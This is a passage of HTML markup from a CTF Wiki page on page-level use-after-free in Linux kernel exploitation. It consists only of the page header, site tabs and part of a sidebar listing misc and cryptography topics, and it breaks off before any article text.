<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="CTF Wiki"><meta name=author content="CTF Wiki Team"><link href=https://ctf-wiki.org/en/pwn/linux/kernel-mode/exploitation/heap/buddy/page-uaf/ rel=canonical><link rel=alternate href=/ hreflang=en><link rel=alternate href=/en/ hreflang=en><link rel=alternate href=/zh-tw/ hreflang=en><link rel="shortcut icon" href=../../../../../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-6.2.8+insiders-1.17.0"><title>Page-level UAF - CTF Wiki</title><link rel=stylesheet href=../../../../../../../assets/stylesheets/main.10cb3b3f.min.css><link rel=stylesheet href=../../../../../../../assets/stylesheets/palette.697e47cb.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font-family:"Noto Sans",;--md-code-font-family:"Source Code Pro",}</style><link rel=stylesheet href=https://ctf-wiki.org/static/css/extra.css></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#page-level-uaf class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=https://ctf-wiki.org/en/ title="CTF Wiki" class="md-header__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> CTF Wiki </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Page-level UAF </span> </div> </div> </div> <div class=md-header__options> <div class=md-select> <span class="md-header__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12.87 15.07l-2.54-2.51.03-.03A17.52 17.52 0 0014.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg> </span> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=/ class=md-select__link> zh - 汉语 </a> </li> <li class=md-select__item> <a href=/en/ class=md-select__link> en - English </a> </li> <li class=md-select__item> <a href=/zh-tw/ class=md-select__link> zh-tw - 繁體中文 </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 00-3 3 3 3 0 003 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0018 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear data-md-component=search-reset tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/ctf-wiki/ctf-wiki title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> </nav> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../../../../../.. class=md-tabs__link> Start </a> </li> <li class=md-tabs__item> <a href=../../../../../../../introduction/history/ class=md-tabs__link> Introduction </a> </li> <li class=md-tabs__item> <a href=../../../../../../../misc/introduction/ class=md-tabs__link> Misc </a> </li> <li class=md-tabs__item> <a href=../../../../../../../crypto/introduction/ class=md-tabs__link> Crypto </a> </li> <li class=md-tabs__item> <a href=../../../../../../../web/introduction/ class=md-tabs__link> Web </a> </li> <li class=md-tabs__item> <a href=../../../../../../../assembly/x86-x64/readme/ class=md-tabs__link> Assembly </a> </li> <li class=md-tabs__item> <a href=../../../../../../../executable/elf/structure/basic-info/ class=md-tabs__link> Executable </a> </li> <li class=md-tabs__item> <a href=../../../../../../../reverse/introduction/ class=md-tabs__link> Reverse </a> </li> <li class=md-tabs__item> <a href=../../../../../user-mode/environment/ class="md-tabs__link md-tabs__link--active"> Pwn </a> </li> <li class=md-tabs__item> <a href=../../../../../../../android/basic_develop/basic_develop/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../../../../../../ics/ctfs/ class=md-tabs__link> ICS </a> </li> <li class=md-tabs__item> <a href=../../../../../../../blockchain/introduction/ class=md-tabs__link> Blockchain </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=https://ctf-wiki.org/en/ title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> CTF Wiki </label> <div class=md-nav__source> <a href=https://github.com/ctf-wiki/ctf-wiki title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1 type=checkbox id=nav-1> <label class=md-nav__link for=nav-1> Start <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Start data-md-level=1> <label class=md-nav__title for=nav-1> <span class="md-nav__icon md-icon"></span> Start </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../.. class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../../../usage/ class=md-nav__link> How to use CTF Wiki </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1-3 type=checkbox id=nav-1-3> <label class=md-nav__link for=nav-1-3> Contributing Guide <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Contributing Guide" data-md-level=2> <label class=md-nav__title for=nav-1-3> <span class="md-nav__icon md-icon"></span> Contributing Guide </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../contribute/before-contributing/ class=md-nav__link> Before Contributing </a> </li> <li class=md-nav__item> <a href=../../../../../../../contribute/basic-contribute-approach/ class=md-nav__link> Basic Contribute Approach </a> </li> <li class=md-nav__item> <a href=../../../../../../../contribute/documentation-requirement/ class=md-nav__link> Document Requirements </a> </li> <li class=md-nav__item> <a href=../../../../../../../contribute/translation/ class=md-nav__link> Translation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../discussion/ class=md-nav__link> Discussion </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-2 type=checkbox id=nav-2> <label class=md-nav__link for=nav-2> Introduction <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Introduction data-md-level=1> <label class=md-nav__title for=nav-2> <span class="md-nav__icon md-icon"></span> Introduction </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../introduction/history/ class=md-nav__link> History of CTF Wiki </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/mode/ class=md-nav__link> CTF Competition Types </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/content/ class=md-nav__link> CTF 竞赛内容 </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/experience/ class=md-nav__link> 线下攻防经验小结 </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/cgc/ class=md-nav__link> CGC 超级挑战赛 </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/resources/ class=md-nav__link> 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3 type=checkbox id=nav-3> <label class=md-nav__link for=nav-3> Misc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Misc data-md-level=1> <label class=md-nav__title for=nav-3> <span class="md-nav__icon md-icon"></span> Misc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/introduction/ class=md-nav__link> 杂项简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/recon/ class=md-nav__link> 信息搜集技术 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-3 type=checkbox id=nav-3-3> <label class=md-nav__link for=nav-3-3> 编码分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=编码分析 data-md-level=2> <label class=md-nav__title for=nav-3-3> <span class="md-nav__icon md-icon"></span> 编码分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/encode/communication/ class=md-nav__link> 通信领域常用编码 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/encode/computer/ class=md-nav__link> 计算机相关的编码 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/encode/modern/ class=md-nav__link> 现实世界中常用的编码 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../misc/prefix/ class=md-nav__link> 取证隐写前置技术 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5 type=checkbox id=nav-3-5> <label class=md-nav__link for=nav-3-5> 图片分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=图片分析 data-md-level=2> <label class=md-nav__title for=nav-3-5> <span class="md-nav__icon md-icon"></span> 图片分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/picture/introduction/ class=md-nav__link> 图片分析简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/picture/png/ class=md-nav__link> PNG </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/picture/jpg/ class=md-nav__link> JPG </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/picture/gif/ class=md-nav__link> GIF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6 type=checkbox id=nav-3-6> <label class=md-nav__link for=nav-3-6> 音频隐写 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=音频隐写 data-md-level=2> <label class=md-nav__title for=nav-3-6> <span class="md-nav__icon md-icon"></span> 音频隐写 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/audio/introduction/ class=md-nav__link> 音频隐写 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7 type=checkbox id=nav-3-7> <label class=md-nav__link for=nav-3-7> 流量包分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流量包分析 data-md-level=2> <label class=md-nav__title for=nav-3-7> <span class="md-nav__icon md-icon"></span> 流量包分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/introduction/ class=md-nav__link> 流量包分析简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/fix/ class=md-nav__link> PCAP 文件修复 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7-3 type=checkbox id=nav-3-7-3> <label class=md-nav__link for=nav-3-7-3> 协议分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=协议分析 data-md-level=3> <label class=md-nav__title for=nav-3-7-3> <span class="md-nav__icon md-icon"></span> 协议分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/readme/ class=md-nav__link> 协议分析概述 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/wireshark/ class=md-nav__link> Wireshark </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/http/ class=md-nav__link> HTTP </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/https/ class=md-nav__link> HTTPS </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/wifi/ class=md-nav__link> WIFI </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/usb/ class=md-nav__link> USB </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/data/ class=md-nav__link> 数据提取 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-8 type=checkbox id=nav-3-8> <label class=md-nav__link for=nav-3-8> 压缩包分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=压缩包分析 data-md-level=2> <label class=md-nav__title for=nav-3-8> <span class="md-nav__icon md-icon"></span> 压缩包分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/archive/zip/ class=md-nav__link> ZIP 格式 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/archive/rar/ class=md-nav__link> RAR 格式 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-9 type=checkbox id=nav-3-9> <label class=md-nav__link for=nav-3-9> 磁盘内存分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=磁盘内存分析 data-md-level=2> <label class=md-nav__title for=nav-3-9> <span class="md-nav__icon md-icon"></span> 磁盘内存分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/disk-memory/introduction/ class=md-nav__link> 磁盘内存分析 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/disk-memory/problem/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-10 type=checkbox id=nav-3-10> <label class=md-nav__link for=nav-3-10> Other <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Other data-md-level=2> <label class=md-nav__title for=nav-3-10> <span class="md-nav__icon md-icon"></span> Other </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/other/pyc/ class=md-nav__link> pyc文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4 type=checkbox id=nav-4> <label class=md-nav__link for=nav-4> Crypto <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Crypto data-md-level=1> <label class=md-nav__title for=nav-4> <span class="md-nav__icon md-icon"></span> Crypto </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/introduction/ class=md-nav__link> 密码学简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-2 type=checkbox id=nav-4-2> <label class=md-nav__link for=nav-4-2> 基础数学知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础数学知识 data-md-level=2> <label class=md-nav__title for=nav-4-2> <span class="md-nav__icon md-icon"></span> 基础数学知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/basic/introduction/ class=md-nav__link> 基础数学知识 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-3 type=checkbox id=nav-4-3> <label class=md-nav__link for=nav-4-3> 古典密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=古典密码 data-md-level=2> <label class=md-nav__title for=nav-4-3> <span class="md-nav__icon md-icon"></span> 古典密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/introduction/ class=md-nav__link> 古典密码简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/monoalphabetic/ class=md-nav__link> 单表代换加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/polyalphabetic/ class=md-nav__link> 多表代换加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/others/ class=md-nav__link> 其它类型加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/summary/ class=md-nav__link> 总结 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4 type=checkbox id=nav-4-4> <label class=md-nav__link for=nav-4-4> 流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流密码 data-md-level=2> <label class=md-nav__title for=nav-4-4> <span class="md-nav__icon md-icon"></span> 流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/intro/ class=md-nav__link> 流密码 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-2 type=checkbox id=nav-4-4-2> <label class=md-nav__link for=nav-4-4-2> 伪随机数生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=伪随机数生成器 data-md-level=3> <label class=md-nav__title for=nav-4-4-2> <span class="md-nav__icon md-icon"></span> 伪随机数生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/prng/intro/ class=md-nav__link> 伪随机数生成器介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/prng/csprng/ class=md-nav__link> 密码安全伪随机数生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/prng/problem/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-3 type=checkbox id=nav-4-4-3> <label class=md-nav__link for=nav-4-4-3> 线性同余生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=线性同余生成器 data-md-level=3> <label class=md-nav__title for=nav-4-4-3> <span class="md-nav__icon md-icon"></span> 线性同余生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/lcg/intro/ class=md-nav__link> 线性同余生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/lcg/challenge/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-4 type=checkbox id=nav-4-4-4> <label class=md-nav__link for=nav-4-4-4> 反馈移位寄存器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反馈移位寄存器 data-md-level=3> <label class=md-nav__title for=nav-4-4-4> <span class="md-nav__icon md-icon"></span> 反馈移位寄存器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/fsr/intro/ class=md-nav__link> 反馈移位寄存器 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/fsr/lfsr/ class=md-nav__link> 线性反馈移位寄存器 - LFSR </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/fsr/nfsr/ class=md-nav__link> 非线性反馈移位寄存器 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-5 type=checkbox id=nav-4-4-5> <label class=md-nav__link for=nav-4-4-5> 特殊流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=特殊流密码 data-md-level=3> <label class=md-nav__title for=nav-4-4-5> <span class="md-nav__icon md-icon"></span> 特殊流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/special/rc4/ class=md-nav__link> RC4 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5 type=checkbox id=nav-4-5> <label class=md-nav__link for=nav-4-5> 块加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=块加密 data-md-level=2> <label class=md-nav__title for=nav-4-5> <span class="md-nav__icon md-icon"></span> 块加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/introduction/ class=md-nav__link> 块加密 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-2 type=checkbox id=nav-4-5-2> <label class=md-nav__link for=nav-4-5-2> ARX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ARX data-md-level=3> <label class=md-nav__title for=nav-4-5-2> <span class="md-nav__icon md-icon"></span> ARX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/arx-operations/ class=md-nav__link> ARX: Add-Rotate-Xor </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-3 type=checkbox id=nav-4-5-3> <label class=md-nav__link for=nav-4-5-3> DES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DES data-md-level=3> <label class=md-nav__title for=nav-4-5-3> <span class="md-nav__icon md-icon"></span> DES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/des/ class=md-nav__link> DES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-4 type=checkbox id=nav-4-5-4> <label class=md-nav__link for=nav-4-5-4> IDEA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=IDEA data-md-level=3> <label class=md-nav__title for=nav-4-5-4> <span class="md-nav__icon md-icon"></span> IDEA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/idea/ class=md-nav__link> IDEA </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-5 type=checkbox id=nav-4-5-5> <label class=md-nav__link for=nav-4-5-5> AES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=AES data-md-level=3> <label class=md-nav__title for=nav-4-5-5> <span class="md-nav__icon md-icon"></span> AES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/aes/ class=md-nav__link> AES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-6 type=checkbox id=nav-4-5-6> <label class=md-nav__link for=nav-4-5-6> Simon and Speck <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Simon and Speck" data-md-level=3> <label class=md-nav__title for=nav-4-5-6> <span class="md-nav__icon md-icon"></span> Simon and Speck </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/simon-speck/ class=md-nav__link> Simon and Speck Block Ciphers </a> </li> </ul> </nav> </li> <li 